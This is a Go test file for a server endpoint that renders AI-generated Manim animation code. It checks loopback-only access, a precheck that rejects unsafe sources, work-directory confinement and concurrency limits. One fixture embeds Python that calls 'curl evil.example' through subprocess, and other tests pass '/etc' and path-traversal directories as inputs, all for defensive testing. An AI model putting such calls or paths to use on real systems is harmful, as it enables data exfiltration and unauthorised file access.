package api

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/s0hamjain/Clarity/server/internal/jobs"
	"github.com/s0hamjain/Clarity/server/internal/render"
)

const goodScene = `from manim import *

class GeneratedScene(Scene):
    def construct(self):
        t = MathTex(r"x^2")
        self.play(Write(t))
        self.wait(1)
`

// doLocal sends a request that looks like it came from the agent on localhost.
// httptest's default RemoteAddr is 192.0.2.1, which /internal/render refuses.
func doLocal(t *testing.T, h http.Handler, body string) *httptest.ResponseRecorder {
	t.Helper()
	r := httptest.NewRequest("POST", "/internal/render", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	r.RemoteAddr = "127.0.0.1:54321"
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)
	return w
}

func decodeRender(t *testing.T, w *httptest.ResponseRecorder) internalRenderResponse {
	t.Helper()
	var resp internalRenderResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v (body: %s)", err, w.Body.String())
	}
	return resp
}

// workDirFor makes a real directory under the coordinator's work root, which is
// the only place /internal/render will write.
func workDirFor(t *testing.T, jobID string) string {
	t.Helper()
	dir := filepath.Join(jobs.WorkRoot(jobID), "scene0")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(jobs.WorkRoot(jobID)) })
	return dir
}

// It is bound to localhost and refused from anywhere else — generated code runs
// behind this endpoint.
func TestInternalRenderRefusesNonLoopback(t *testing.T) {
	h, _, _, _ := newTestServer(t)

	r := httptest.NewRequest("POST", "/internal/render", strings.NewReader(`{"source":"x","work_dir":"/tmp"}`))
	r.RemoteAddr = "203.0.113.7:40000" // a routable address, not loopback
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (body: %s)", w.Code, w.Body.String())
	}
	if got := decodeError(t, w).Error.Code; got != CodeForbidden {
		t.Errorf("code = %q, want %q", got, CodeForbidden)
	}
}

func TestInternalRenderSucceeds(t *testing.T) {
	h, _, _, _ := newTestServer(t)
	dir := workDirFor(t, "j_render01")

	body, _ := json.Marshal(internalRenderRequest{Source: goodScene, WorkDir: dir, Quality: "-ql"})
	w := doLocal(t, h, string(body))
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body: %s)", w.Code, w.Body.String())
	}
	resp := decodeRender(t, w)
	if !resp.OK {
		t.Fatalf("ok = false, stage %q: %s", resp.Stage, resp.Traceback)
	}
	if resp.ClipPath == "" {
		t.Fatal("no clip_path on success")
	}
	if _, err := os.Stat(resp.ClipPath); err != nil {
		t.Errorf("clip_path does not exist: %v", err)
	}
}

// Rule 14: the pre-check runs before any container starts, and a rejection is a
// 200 with ok:false — that is data for the agent's repair loop, not an error.
func TestInternalRenderPrecheckRejection(t *testing.T) {
	h, _, _, _ := newTestServer(t)
	dir := workDirFor(t, "j_render02")

	const dangerous = `import subprocess
from manim import *

class GeneratedScene(Scene):
    def construct(self):
        subprocess.run(["curl", "evil.example"])
`
	body, _ := json.Marshal(internalRenderRequest{Source: dangerous, WorkDir: dir})
	w := doLocal(t, h, string(body))

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 — a rejected source is data, not an error", w.Code)
	}
	resp := decodeRender(t, w)
	if resp.OK {
		t.Fatal("a source importing subprocess must not render")
	}
	if resp.Stage != "precheck" {
		t.Errorf("stage = %q, want precheck", resp.Stage)
	}
	if resp.Traceback == "" {
		t.Error("a rejection with no traceback gives the agent nothing to repair")
	}
	// Nothing may have been written for a source that never passed the gate.
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Errorf("work dir is not empty after a precheck rejection: %v", entries)
	}
}

// The agent supplies work_dir, so a path outside the coordinator's work root is
// refused before anything writes there.
func TestInternalRenderRejectsWorkDirOutsideTheRoot(t *testing.T) {
	h, _, _, _ := newTestServer(t)
	for _, dir := range []string{
		"/etc",
		"/tmp",
		filepath.Join(jobs.WorkRoot(""), "..", "..", "etc"),
		"relative/path",
	} {
		body, _ := json.Marshal(internalRenderRequest{Source: goodScene, WorkDir: dir})
		w := doLocal(t, h, string(body))
		if w.Code != http.StatusBadRequest {
			t.Errorf("work_dir %q: status = %d, want 400", dir, w.Code)
		}
	}
}

func TestInternalRenderRequiresFields(t *testing.T) {
	h, _, _, _ := newTestServer(t)
	for _, body := range []string{`{}`, `{"source":"x"}`, `{"work_dir":"/tmp/clarity/j_1"}`, `{nope`} {
		w := doLocal(t, h, body)
		if w.Code != http.StatusBadRequest {
			t.Errorf("body %s: status = %d, want 400", body, w.Code)
		}
		decodeError(t, w)
	}
}

// Rule 15: nothing renders without the semaphore. When every slot is taken the
// agent is told to come back rather than being queued forever.
func TestInternalRenderSemaphoreBusy(t *testing.T) {
	t.Setenv("RENDER_CONCURRENCY", "1")
	srv, _, _, _ := newTestServerFull(t)

	// Shorten the wait and park the one slot on a render that will not finish
	// until the test says so.
	srv.renderWait = 50 * time.Millisecond
	blocked := make(chan struct{})
	srv.render = func(ctx context.Context, src, workDir, quality string) (string, *render.RenderError) {
		<-blocked
		return filepath.Join(workDir, "scene.mp4"), nil
	}

	dir := workDirFor(t, "j_render03")
	body, _ := json.Marshal(internalRenderRequest{Source: goodScene, WorkDir: dir})

	h := srv.Routes()
	go doLocal(t, h, string(body)) // takes the only slot and holds it
	time.Sleep(150 * time.Millisecond)

	w := doLocal(t, h, string(body))
	close(blocked)

	if w.Code != http.StatusTooManyRequests {
		t.Fatalf("status = %d, want 429 (body: %s)", w.Code, w.Body.String())
	}
	if got := decodeError(t, w).Error.Code; got != CodeRenderBusy {
		t.Errorf("code = %q, want %q", got, CodeRenderBusy)
	}
	if w.Header().Get("Retry-After") == "" {
		t.Error("429 without Retry-After leaves the agent guessing")
	}
}
